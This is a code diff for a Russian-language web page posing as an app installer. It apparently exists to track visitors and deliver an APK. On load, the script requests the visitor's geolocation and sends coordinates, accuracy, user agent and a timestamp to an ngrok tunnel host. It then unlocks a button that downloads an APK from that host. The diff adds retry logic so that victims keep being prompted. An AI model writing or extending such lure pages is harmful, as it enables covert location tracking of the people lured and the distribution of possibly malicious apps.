@@ -6,58 +6,83 @@
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
     #status { margin-bottom: 15px; }
-    #installBtn {
+    #installBtn, #retryBtn {
       display: none;
       padding: 12px 20px;
-      background: #28a745;
-      color: white;
       border: none;
       border-radius: 5px;
       font-size: 16px;
       cursor: pointer;
     }
+    #installBtn {
+      background: #28a745;
+      color: white;
+      margin-right: 10px;
+    }
+    #retryBtn {
+      background: #007bff;
+      color: white;
+    }
   </style>
 </head>
 <body>
-  <h2>Добро пожаловать! Для установки дайте разрешение</h2>
+  <h2>Добро пожаловать! Для установки дайте разршения</h2>
   <p id="status">Ожидание разрешения...</p>
   <button id="installBtn">Установить приложение</button>
+  <button id="retryBtn">Повторить запрос</button>
 
   <script>
     const status = document.getElementById('status');
     const installBtn = document.getElementById('installBtn');
+    const retryBtn = document.getElementById('retryBtn');
 
-    navigator.geolocation.getCurrentPosition(
-      async position => {
-        const geoData = {
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          userAgent: navigator.userAgent,
-          timestamp: new Date().toISOString()
-        };
+    function requestGeo() {
+      navigator.geolocation.getCurrentPosition(
+        async position => {
+          const geoData = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+          };
 
-        try {
-          await fetch("https://c0e0-149-102-242-94.ngrok-free.app/log", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(geoData)
-          });
+          try {
+            await fetch("https://c0e0-149-102-242-94.ngrok-free.app/log", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(geoData)
+            });
 
-          installBtn.style.display = "inline-block";
-          status.textContent = "Спасибо! Теперь вы можете установить приложение.";
-        } catch (err) {
-          status.textContent = "Ошибка отправки данных.";
+            status.textContent = "Спасибо! Теперь вы можете установить приложение.";
+            installBtn.style.display = "inline-block";
+            retryBtn.style.display = "none";
+          } catch (err) {
+            status.textContent = "Ошибка отправки данных.";
+            retryBtn.style.display = "inline-block";
+            installBtn.style.display = "none";
+          }
+        },
+        error => {
+          status.textContent = "Ошибка геолокации: " + error.message;
+          retryBtn.style.display = "inline-block";
+          installBtn.style.display = "none";
         }
-      },
-      err => {
-        status.textContent = "Ошибка геолокации: " + err.message;
-      }
-    );
+      );
+    }
+
+    retryBtn.onclick = () => {
+      status.textContent = "Ожидайте.";
+      retryBtn.style.display = "none";
+      requestGeo();
+    };
 
     installBtn.onclick = () => {
       window.location.href = "https://c0e0-149-102-242-94.ngrok-free.app/download/app.apk";
     };
+
+    // Авто-запрос геолокации с небольшой задержкой, чтобы дать время странице загрузиться
+    setTimeout(requestGeo, 1000);
   </script>
 </body>
 </html>
